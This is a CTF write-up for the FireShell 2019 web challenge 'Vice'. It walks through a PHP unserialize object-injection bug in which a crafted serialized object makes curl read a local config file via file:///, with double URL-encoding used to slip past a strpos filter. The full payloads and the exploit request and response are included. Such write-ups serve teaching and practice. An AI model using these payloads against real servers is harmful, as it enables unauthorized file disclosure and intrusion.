<h1>FireShell CTF 2019 â€“ Vice</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 269</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p><a href="http://68.183.31.62:991/">http://68.183.31.62:991/</a></p>
</blockquote>

<h2>Solution</h2>

<p>The challenge will give you a PHP script.</p>

<p>```php
<?php
//require_once 'config.php';</p>

<p>class SHITS{
  private $url;
  private $method;
  private $addr;
  private $host;
  private $name;</p>

<p>function __construct($method,$url){
    $this->method = $method;
    $this->url = $url;
  }</p>

<p>function doit(){</p>

<pre><code>$this-&gt;host = @parse_url($this-&gt;url)['host'];
$this-&gt;addr = @gethostbyname($this-&gt;host);
$this-&gt;name = @gethostbyaddr($this-&gt;host);
if($this-&gt;addr !== "127.0.0.1" || $this-&gt;name === false){
  $not = ['.txt','.php','.xml','.html','.','[',']'];
  foreach($not as $ext){
    $p = strpos($this-&gt;url,$ext);
    if($p){
      die(":)");
    }
  }
  $ch = curl_init();
  curl_setopt($ch,CURLOPT_URL,$this-&gt;url);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

  $result = curl_exec($ch);
  echo $result;
}else{
  die(":)");
}
</code></pre>

<p>}
  function <em>_destruct(){
    if(in</em>array($this->method,array("doit"))){</p>

<pre><code>  call_user_func_array(array($this,$this-&gt;method),array());
}else{
  die(":)");
}
</code></pre>

<p>}
}
if(isset($<em>GET["gg"])) {
    @unserialize($</em>GET["gg"]);
} else {
    highlight_file(<strong>FILE</strong>);
}
```</p>

<p>The flag is probably stored into <code>config.php</code> file, hence it must be printed via the <em>curl</em> execution.</p>

<p>To perform this, the <code>doit</code> method must be executed. That method is invoked into <code>__destruct()</code> function if present in the <code>$method</code> attribute of the destructed object.</p>

<p>The <code>unserialize</code> method must be abused to craft an object with desired parameters.</p>

<p>To serialize an object that can be used for the exploit, the following script can be executed.</p>

<p>```php
class SHITS{
  private $url;
  private $method;
  private $addr;
  private $host;
  private $name;
}</p>

<p>print serialize(new SHITS);
```</p>

<p>It will print the following.</p>

<p><code>
O:5:"SHITS":5:{s:10:"SHITSurl";N;s:13:"SHITSmethod";N;s:11:"SHITSaddr";N;s:11:"SHITShost";N;s:11:"SHITSname";N;}
</code></p>

<p>Now you have to customize the script in order to exploit the challenge.</p>

<p>First of all, the <code>$method</code> attribute must be set to <code>doit</code>.</p>

<p>```php
class SHITS{
  private $url;
  private $method = "doit";
  private $addr;
  private $host;
  private $name;
}</p>

<p>print serialize(new SHITS);
```</p>

<p>The next attribute to set is <code>$url</code>. Analyzing the script, you can discover the presence of a check on localhost address. To bypass this check, the URL could be crafted based on the default path for web sites on Apache servers: <code>file:///var/www/html/config.php</code>.</p>

<p>```php
class SHITS{
  private $url = "file:///var/www/html/config.php";
  private $method = "doit";
  private $addr;
  private $host;
  private $name;
}</p>

<p>print serialize(new SHITS);
```</p>

<p>At this point, another check present in the script must be bypassed. The second checks is referred to the file extension; in particular, the extension <code>.php</code> will be blocked.</p>

<p>Luckily, the check is performed via <code>strpos</code> and there is a well-known strange behavior, based on which double URL-encoded chars are not considered by <code>strpos</code> but are considered valid by <em>curl</em> (<a href="https://bugs.php.net/bug.php?id=76671&edit=1">https://bugs.php.net/bug.php?id=76671&amp;edit=1</a>). So it is sufficient to replace the <code>.</code> char with <code>%252e</code>.</p>

<p>```php
class SHITS{
  private $url = "file:///var/www/html/config.php";
  private $method = "doit";
  private $addr;
  private $host;
  private $name;
}</p>

<p>print str_replace(".", "%252e", serialize(new SHITS));
```</p>

<p>The produced payload will be the following.</p>

<p><code>
O:5:"SHITS":5:{s:10:"SHITSurl";s:31:"file:///var/www/html/config%252ephp";s:13:"SHITSmethod";s:4:"doit";s:11:"SHITSaddr";N;s:11:"SHITShost";N;s:11:"SHITSname";N;} 
</code></p>

<p>After this operation the payload must be modified according to the <code>str_replace</code>.</p>

<p>The string <code>file:///var/www/html/config.php</code> is composed by 31 chars, with the replace operation it will become <code>file:///var/www/html/config%252ephp</code>; the GET operation performed server side will automatically perform a URL decode translating <code>%25</code> to <code>%</code>, hence the string will be <code>file:///var/www/html/config%2ephp</code> composed by 33 chars.</p>

<p>The length of the string into the payload must be updated accordingly.</p>

<p><code>
O:5:"SHITS":5:{s:10:"SHITSurl";s:33:"file:///var/www/html/config%252ephp";s:13:"SHITSmethod";s:4:"doit";s:11:"SHITSaddr";N;s:11:"SHITShost";N;s:11:"SHITSname";N;}
</code></p>

<p>At this point, the payload can be URL-encoded with the following script (don't forget to update the length of the URL string).</p>

<p>```php
class SHITS{
  private $url = "file:///var/www/html/config.php";
  private $method = "doit";
  private $addr;
  private $host;
  private $name;
}</p>

<p>print str_replace(".", "%252e", urlencode(serialize(new SHITS)));
```</p>

<p>The payload will be the following.</p>

<p><code>
O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D
</code></p>

<p>The GET request and response will be the following.</p>

<p>```
GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D HTTP/1.1
Host: 68.183.31.62:991
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ugifl5ke3p183slvcbcs6r5054
Upgrade-Insecure-Requests: 1</p>

<p>HTTP/1.1 200 OK
Date: Sun, 27 Jan 2019 16:19:07 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Vary: Accept-Encoding
Content-Length: 137
Connection: close
Content-Type: text/html</p>

<p><?php
if($<em>SERVER['REMOTE</em>ADDR'] !== '::1' || $<em>SERVER['REMOTE</em>ADDR'] !== '127.0.0.1'){
echo "aaawn";
}else{
$flag ="F#{wtf<em>5trp0s</em>}";
}
```</p>

<p>The flag is the following.</p>

<p><code>
F#{wtf_5trp0s_}
</code></p>
